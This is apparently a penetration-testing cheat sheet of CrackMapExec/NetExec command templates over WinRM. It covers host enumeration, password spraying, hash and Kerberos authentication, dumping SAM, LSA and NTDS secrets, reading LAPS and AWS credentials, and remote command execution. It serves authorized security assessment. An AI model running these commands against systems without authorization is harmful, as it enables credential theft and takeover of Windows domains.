# cme (WINRM)

% cme, crackmapexec, Active directory, nxc, netexec, winrm

## Enumerate WinRM reachable hosts
#assessment/AD #attack_type/Enumeration #port/5985 #port/5986 #protocol/winrm #access/Anonymous

Enumerate network hosts that can be reached via WinRM.

```bash
cme winrm <ip>
```

## Password spray (username=password)
#assessment/AD #attack_type/Bruteforce #port/5985 #port/5986 #protocol/winrm #access/Anonymous

Password spray to find accounts with weak passwords.

```bash
cme winrm <ip> -u <users.list> -p <users.list> --no-bruteforce --continue-on-success
```

## WinRM auth
#assessment/AD #attack_type/Authentication #port/5985 #port/5986 #protocol/winrm #access/WinRM_user 

Authenticate via a WinRM account on the remote target.

```bash
cme winrm <ip> -u <user> -p <password>
```

## Domain auth
#assessment/AD #attack_type/Authentication #port/5985 #port/5986 #protocol/winrm #access/Domain_user 

Authenticate via a domain account on the remote target.

```bash
cme winrm <ip> -u <user> -p <password> -d <domain>
```

## Domain auth with hash
#assessment/AD #attack_type/Authentication #port/5985 #port/5986 #protocol/winrm #access/Domain_user 

```bash
cme winrm <ip> -u <user> -H <hash> -d <domain>
```

## Local auth
#assessment/AD #attack_type/Authentication #port/5985 #port/5986 #protocol/winrm #access/Local_user

Authenticate via a local account on the remote target.

```bash
cme winrm <ip> -u <user> -p <password> --local-auth
```

## Local auth with hash
#assessment/AD #attack_type/Authentication #port/5985 #port/5986 #protocol/winrm #access/Local_user

Authenticate via a local account using the hash on the remote target.

```bash
cme winrm <ip> -u <user> -H <hash> --local-auth
```

## Kerberos auth
#assessment/AD #attack_type/Authentication #port/5985 #port/5986 #protocol/winrm #access/Local_user

Authenticate via Kerberos on the remote target.

```bash
cme winrm <ip> -u <user> -p <password> -k
```

## Kerberos TGT auth
#assessment/AD #attack_type/Authentication #port/5985 #port/5986 #protocol/winrm #access/Local_user

Authenticate via a Kerberos TGT on the remote target.

Previously import ticket : 
    $ export KRB5CCNAME=ticket.ccache

```bash
cme winrm <ip> -u <user> -k --use-kcache
```

## Dump SAM
#assessment/AD #attack_type/Dump #port/5985 #port/5986 #protocol/winrm #access/Admin

Dump SAM hashes using methods from secretsdump.py

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme winrm <ip> -u <user> -p <password> --sam
```

## Dump LSA
#assessment/AD #attack_type/Dump #port/5985 #port/5986 #protocol/winrm #access/Admin

Dump LSA secrets.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme winrm <ip> -u <user> -p <password> --lsa
```

## Dump NTDS (raw)
#assessment/AD #attack_type/Dump #port/5985 #port/5986 #protocol/winrm #access/Domain_admin

Dump the NTDS.dit, SAM and SYSTEM files by accessing the raw hard drive.

⚠️ Requirement : Domain Admin ou Local admin privileges on the Domain Controller

```bash
cme winrm <dc-ip> -u <user> -p <password> -M ntds-dump-raw
```

## Dump AWS secrets
#assessment/AD #attack_type/Dump #port/5985 #port/5986 #protocol/winrm #access/Admin

Search for AWS credential files.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme winrm <ip> -u <user> -p <password> -M aws-credentials
```

## Read LAPS password
#assessment/AD #attack_type/Dump #port/5985 #port/5986 #protocol/winrm #access/Domain_user

Read LAPS password.

If the default local administrator name is not "administrator" add the user after the option "--laps <name>"

⚠️ Requirement : ms-Mcs-AdmPwd attribute set "Read Property" on a computer object.

```bash
cme winrm <ip> -u <user> -p <password> -M laps
```

## Execute remote commands (CMD)
#assessment/AD #attack_type/Command_Execution #port/5985 #port/5986 #protocol/winrm #access/Domain_user

Execute remote commands through Windows CMD.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme winrm <ip> -u <user> -p <password> -x <command>
```

## Execute remote commands (PowerShell)
#assessment/AD #attack_type/Command_Execution #port/5985 #port/5986 #protocol/winrm #access/Domain_user

Execute remote commands through Windows PowerShell.

```bash
cme winrm <ip> -u <user> -p <password> -X <command>
```

= dc-ip: $DC_IP
= user: $USER
= password: $PASSWORD
= domain: $DOMAIN
